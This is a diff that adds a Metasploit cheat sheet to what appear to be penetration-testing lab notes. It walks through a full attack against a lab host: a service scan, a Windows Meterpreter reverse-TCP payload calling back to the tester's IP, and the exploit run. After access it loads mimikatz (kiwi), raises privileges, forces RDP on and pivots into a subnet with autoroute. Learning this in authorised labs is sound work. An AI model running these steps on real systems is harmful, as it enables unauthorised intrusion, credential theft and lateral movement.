@@ -374,6 +374,73 @@
   #details of particular user
   ```
 
+* Metasploit to exploit machines:
+
+  ```shell
+  msfdb init #initialize database
+
+  msfconsole
+
+  db_status #check if db connected
+
+  db_nmap -sV 10.10.91.69 #scan machine and feed results into db
+  #identify vulnerable services and their ports
+
+  hosts #view info about hosts from db
+
+  services #info about services from db
+
+  vulns #info about discovered vulnerabilities
+
+  search multi/handler #search exploit
+
+  use 5 exploit/multi/handler #can also use only number, to use module
+
+  set PAYLOAD windows/meterpreter/reverse_tcp #set payload
+
+  set LHOST 10.17.48.136 #set own IP as lhost
+
+  use icecast #switch to use different module, works if the string is unique
+
+  set RHOSTS 10.10.91.69
+
+  exploit #run module
+  #alternatively, we can do 'run -j' to run this as a job
+
+  jobs #check jobs
+
+  sessions #check sessions
+
+  sessions -i 1 #interact with session 1
+
+  #after getting shell
+  ps #to check running processes
+
+  help #view commands
+
+  sysinfo #get info about system
+
+  load kiwi #load new version of mimikatz
+
+  getprivs #enable all privileges available to current user
+
+  ipconfig #view network info of target system
+
+  run post/windows/gather/checkvm #POST module to check if we are in VM
+
+  run post/multi/recon/local_exploit_suggester #checks for exploits which can be run in session to elevate privileges
+
+  run post/windows/manage/enable_rdp #try forcing rdp to be enable
+
+  shell #spawn normal system shell
+
+  run autoroute -h #help menu for autoroute
+
+  run autoroute -s 172.18.1.0 -n 255.255.255.0 #add a route to the subnet
+
+  background #backgrounds currrent session
+  ```
+
 ## Basic Computer Exploitation
 
 ---
